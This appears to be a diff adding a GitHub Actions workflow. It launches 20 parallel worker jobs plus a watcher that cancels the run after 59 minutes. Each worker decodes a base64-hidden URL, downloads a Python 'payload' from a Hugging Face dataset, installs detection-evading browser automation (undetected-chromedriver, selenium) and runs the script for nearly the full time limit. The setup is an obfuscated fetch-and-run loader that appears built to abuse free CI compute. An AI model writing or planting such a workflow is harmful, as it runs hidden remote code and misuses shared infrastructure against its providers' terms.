@@ -1,0 +1,103 @@
+name: Nexus Core Hyperion Watcher
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: hyperion-node-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watcher: pauses for 3540 seconds then terminates the run
+  # =================================================================
+  core-watcher:
+    name: "Hyperion Watcher"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DELAY: 3540
+    steps:
+      - name: Initialize Watcher
+        run: |
+          echo "[WATCHER] Watcher online for execution ID: ${{ github.run_id }}"
+          echo "[WATCHER] Monitoring active state for ${WATCH_DELAY} seconds."
+
+          sleep "${WATCH_DELAY}"
+
+          echo "[WATCHER] Threshold reached — transmitting termination signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHER] Termination signal dispatched. All active and pending tasks will be halted."
+
+  # =================================================================
+  # Hyperion Grid: distributed parallel worker execution
+  # =================================================================
+  hyperion-grid:
+    name: "AlphaNode-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [x7a1, x7a2, x7a3, x7a4, x7b1, x7b2, x7b3, x7b4, x7c1, x7c2, x7c3, x7c4, x7d1, x7d2, x7d3, x7d4, x7e1, x7e2, x7e3, x7e4]
+
+    steps:
+      # #################################################################
+      # Phase 1: Environment Setup
+      # #################################################################
+      - name: Prepare Worker Environment
+        run: |
+          echo "[SETUP] Initializing AlphaNode-${{ matrix.node_key }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Phase 2: Retrieve Payload Binary
+      # #################################################################
+      - name: Pull Core Payload
+        run: |
+          echo "[PULL] Fetching remote payload binary..."
+          PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$PAYLOAD_URL" -o core_engine.py
+          echo "[PULL] Payload successfully acquired."
+
+      # #################################################################
+      # Phase 3: Setup Dependencies
+      # #################################################################
+      - name: Install Runtime Modules
+        run: |
+          echo "[MODULES] Installing required packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Phase 4: Execute Core Engine (59-minute boundary)
+      # #################################################################
+      - name: Start Core Engine
+        run: |
+          echo ">> Starting AlphaNode-${{ matrix.node_key }} engine process..."
+
+          python3 core_engine.py &
+          ENGINE_PID=$!
+
+          echo ">> Engine active. Time limit: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$ENGINE_PID" 2>/dev/null; then
+            echo ">> Time limit exceeded — stopping engine process."
+            kill -9 "$ENGINE_PID"
+            echo ">> Engine forcefully terminated by supervisor."
+          else
+            echo ">> Engine finished execution before limit."
+          fi
